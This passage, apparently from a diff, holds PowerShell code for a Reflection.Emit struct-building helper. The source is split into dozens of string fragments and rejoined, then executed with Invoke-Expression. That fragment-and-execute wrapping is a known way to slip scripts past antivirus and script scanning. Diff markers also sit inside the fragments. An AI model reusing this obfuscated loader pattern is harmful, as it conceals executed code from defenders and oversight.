+','    Param (','
+        [P','arameter(Po','sition = 1,',' Mandatory=','$True)]
+   ','     [Valid','ateScript({','($_ -is [Re','flection.Em','it.ModuleBu','ilder]) -or',' ($_ -is [R','eflection.A','ssembly])})',']
+        $','Module,
+
+  ','      [Para','meter(Posit','ion = 2, Ma','ndatory=$Tr','ue)]
+      ','  [Validate','NotNullOrEm','pty()]
+    ','    [String',']
+        $','FullName,
+
+','        [Pa','rameter(Pos','ition = 3, ','Mandatory=$','True)]
+    ','    [Valida','teNotNullOr','Empty()]
+  ','      [Hash','table]
+    ','    $Struct','Fields,
+
+  ','      [Refl','ection.Emit','.PackingSiz','e]
+        ','$PackingSiz','e = [Reflec','tion.Emit.P','ackingSize]','::Unspecifi','ed,
+
+      ','  [Switch]
+','        $Ex','plicitLayou','t
+    )
+
+  ','  if ($Modu','le -is [Ref','lection.Ass','embly])
+   ',' {
+        ','return ($Mo','dule.GetTyp','e($FullName','))
+    }
+
+ ','   [Reflect','ion.TypeAtt','ributes] $S','tructAttrib','utes = ''Ans','iClass,
+   ','     Class,','
+        Pu','blic,
+     ','   Sealed,
+','        Bef','oreFieldIni','t''
+
+    if ','($ExplicitL','ayout)
+    ','{
+        $','StructAttri','butes = $St','ructAttribu','tes -bor [R','eflection.T','ypeAttribut','es]::Explic','itLayout
+  ','  }
+    els','e
+    {
+   ','     $Struc','tAttributes',' = $StructA','ttributes -','bor [Reflec','tion.TypeAt','tributes]::','SequentialL','ayout
+    }','
+
+    $Stru','ctBuilder =',' $Module.De','fineType($F','ullName, $S','tructAttrib','utes, [Valu','eType], $Pa','ckingSize)
+','    $Constr','uctorInfo =',' [Runtime.I','nteropServi','ces.Marshal','AsAttribute','].GetConstr','uctors()[0]','
+    $SizeC','onst = @([R','untime.Inte','ropServices','.MarshalAsA','ttribute].G','etField(''Si','zeConst''))
+','
+    $Field','s = New-Obj','ect Hashtab','le[]($Struc','tFields.Cou','nt)
+
+    # ','Sort each f','ield accord','ing to the ','orders spec','ified
+    #',' Unfortunat','ely, PSv2 d','oesn''t have',' the luxury',' of the
+   ',' # hashtabl','e [Ordered]',' accelerato','r.
+    fore','ach ($Field',' in $Struct','Fields.Keys',')
+    {
+   ','     $Index',' = $StructF','ields[$Fiel','d][''Positio','n'']
+       ',' $Fields[$I','ndex] = @{F','ieldName = ','$Field; Pro','perties = $','StructField','s[$Field]}
+','    }
+
+    ','foreach ($F','ield in $Fi','elds)
+    {','
+        $F','ieldName = ','$Field[''Fie','ldName'']
+  ','      $Fiel','dProp = $Fi','eld[''Proper','ties'']
+
+   ','     $Offse','t = $FieldP','rop[''Offset',''']
+        ','$Type = $Fi','eldProp[''Ty','pe'']
+      ','  $MarshalA','s = $FieldP','rop[''Marsha','lAs'']
+
+    ','    $NewFie','ld = $Struc','tBuilder.De','fineField($','FieldName, ','$Type, ''Pub','lic'')
+
+    ','    if ($Ma','rshalAs)
+  ','      {
+   ','         $U','nmanagedTyp','e = $Marsha','lAs[0] -as ','([Runtime.I','nteropServi','ces.Unmanag','edType])
+  ','          i','f ($Marshal','As[1])
+    ','        {
+ ','           ','    $Size =',' $MarshalAs','[1]
+       ','         $A','ttribBuilde','r = New-Obj','ect Reflect','ion.Emit.Cu','stomAttribu','teBuilder($','Constructor','Info,
+     ','           ','    $Unmana','gedType, $S','izeConst, @','($Size))
+  ','          }','
+          ','  else
+    ','        {
+ ','           ','    $Attrib','Builder = N','ew-Object R','eflection.E','mit.CustomA','ttributeBui','lder($Const','ructorInfo,',' [Object[]]',' @($Unmanag','edType))
+  ','          }','
+
+         ','   $NewFiel','d.SetCustom','Attribute($','AttribBuild','er)
+       ',' }
+
+       ',' if ($Expli','citLayout) ','{ $NewField','.SetOffset(','$Offset) }
+','    }
+
+    ','# Make the ','struct awar','e of its ow','n size.
+   ',' # No more ','having to c','all [Runtim','e.InteropSe','rvices.Mars','hal]::SizeO','f!
+    $Siz','eMethod = $','StructBuild','er.DefineMe','thod(''GetSi','ze'',
+      ','  ''Public, ','Static'',
+  ','      [Int]',',
+        [','Type[]] @()',')
+    $ILGe','nerator = $','SizeMethod.','GetILGenera','tor()
+    #',' Thanks for',' the help, ','Jason Shirk','!
+    $ILGe','nerator.Emi','t([Reflecti','on.Emit.OpC','odes]::Ldto','ken, $Struc','tBuilder)
+ ','   $ILGener','ator.Emit([','Reflection.','Emit.OpCode','s]::Call,
+ ','       [Typ','e].GetMetho','d(''GetTypeF','romHandle'')',')
+    $ILGe','nerator.Emi','t([Reflecti','on.Emit.OpC','odes]::Call',',
+        [','Runtime.Int','eropService','s.Marshal].','GetMethod(''','SizeOf'', [T','ype[]] @([T','ype])))
+   ',' $ILGenerat','or.Emit([Re','flection.Em','it.OpCodes]','::Ret)
+
+   ',' # Allow fo','r explicit ','casting fro','m an IntPtr','
+    # No m','ore having ','to call [Ru','ntime.Inter','opServices.','Marshal]::P','trToStructu','re!
+    $Im','plicitConve','rter = $Str','uctBuilder.','DefineMetho','d(''op_Impli','cit'',
+     ','   ''Private','Scope, Publ','ic, Static,',' HideBySig,',' SpecialNam','e'',
+       ',' $StructBui','lder,
+     ','   [Type[]]',' @([IntPtr]','))
+    $ILG','enerator2 =',' $ImplicitC','onverter.Ge','tILGenerato','r()
+    $IL','Generator2.','Emit([Refle','ction.Emit.','OpCodes]::N','op)
+    $IL','Generator2.','Emit([Refle','ction.Emit.','OpCodes]::L','darg_0)
+   ',' $ILGenerat','or2.Emit([R','eflection.E','mit.OpCodes',']::Ldtoken,',' $StructBui','lder)
+    $','ILGenerator','2.Emit([Ref','lection.Emi','t.OpCodes]:',':Call,
+    ','    [Type].','GetMethod(''','GetTypeFrom','Handle''))
+ ','   $ILGener','ator2.Emit(','[Reflection','.Emit.OpCod','es]::Call,
+','        [Ru','ntime.Inter','opServices.','Marshal].Ge','tMethod(''Pt','rToStructur','e'', [Type[]','] @([IntPtr','], [Type]))',')
+    $ILGe','nerator2.Em','it([Reflect','ion.Emit.Op','Codes]::Unb','ox_Any, $St','ructBuilder',')
+    $ILGe','nerator2.Em','it([Reflect','ion.Emit.Op','Codes]::Ret',')
+
+    $Str','uctBuilder.','CreateType(',')
 }
 '); $script = $fragments -join ''; Invoke-Expression $script
